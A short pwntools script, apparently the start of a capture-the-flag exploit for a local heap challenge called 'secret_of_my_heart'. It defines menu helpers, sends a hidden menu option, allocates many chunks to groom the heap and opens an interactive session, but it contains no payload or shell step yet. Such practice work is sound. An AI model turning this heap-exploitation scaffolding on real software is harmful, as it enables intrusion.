from pwn import*

def ADD(option, size, name, secret):
	if(option==0):
		s.recvuntil("choice :")
	s.send("1\n")
	s.recvuntil("Size of heart : ")
	s.send(str(size))
	s.recvuntil("Name of heart :")
	s.send(name)
	s.recvuntil("secret of my heart :")
	s.send(secret)

def SHOW(option, index):
	if(option==0):
		s.recvuntil("choice :")
		s.send("2\n")
		s.recvuntil("Index :")
		s.send(str(index))
	else:
		s.send("2\n")
		s.recvuntil("Index :")
		s.send(str(index))

def DELETE(option, index):
	if(option==0):
		s.recvuntil("choice :")
	s.send("3\n")
	s.recvuntil("Index :")
	s.send(str(index))

def SECRET(option):
	if(option==0):
		s.recvuntil("choice :")
	s.send("4869\n")
	print(s.recv(1024))
s=process("./secret_of_my_heart")
for i in range(84):
	ADD(0,20,"heeyeon","abcd")

pause()
ADD(0,20,"heeyeon","abcd")
ADD(0,20,"heeyeon","abcd")
ADD(0,20,"heeyeon","abcd")
SHOW(0,0)
s.interactive()
s.close()